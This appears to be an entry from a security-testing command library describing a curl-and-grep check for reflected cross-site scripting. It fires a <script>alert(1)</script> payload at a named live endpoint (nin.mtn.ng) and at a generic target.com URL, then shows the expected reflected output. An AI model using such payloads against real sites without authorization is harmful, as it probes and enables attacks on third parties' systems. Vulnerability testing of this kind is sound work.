---
id: cmd-uuid-456
data: >-
  curl -ski
  "https://nin.mtn.ng/nin/success?message=lol&nin=<script>alert(1)</script>" |
  grep "alert"
tags:
  - xss
  - verification
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows (with curl)
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:55.337Z'
verified: false
validated: true
submitted: true
---
# curl-grep-xss-reflection

## Command

```bash
curl -ski "https://nin.mtn.ng/nin/success?message=lol&nin=<script>alert(1)</script>" | grep "alert"
```

## Description

This command sends an HTTP GET request to the target endpoint with an XSS payload in the 'nin' parameter and uses grep to search the response for evidence of reflection, confirming the vulnerability by detecting the unsanitized 'alert' keyword in the HTML output. Use it during web vulnerability testing to verify reflected XSS without a browser.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode: Suppresses progress meter and error messages | Yes |
| `-k` | Insecure: Skips SSL certificate verification (useful for self-signed certs) | Yes |
| `-i` | Include response headers in output | Yes |
| URL | The target URL with payload: https://nin.mtn.ng/nin/success?message=lol&nin=<script>alert(1)</script> | Yes |
| `| grep "alert"` | Pipes output to grep and searches for lines containing 'alert' | Yes |

## Examples

### Basic Usage

```bash
curl -ski "https://nin.mtn.ng/nin/success?message=lol&nin=<script>alert(1)</script>" | grep "alert"
```

### Advanced Usage

```bash
curl -ski "https://target.com/vuln?param=<script>alert(1)</script>" | grep -i "alert\|script"
```

> Adds case-insensitive search for broader payload detection.

## Expected Output

A line from the HTML response body, such as:

`<p>nin: <script>alert(1)</script></p>`

or similar, indicating the payload was reflected. No output means the payload was sanitized or blocked.

## Related

- [[Related Procedure: Exploit-Reflected-XSS-in-Query-Parameter]]
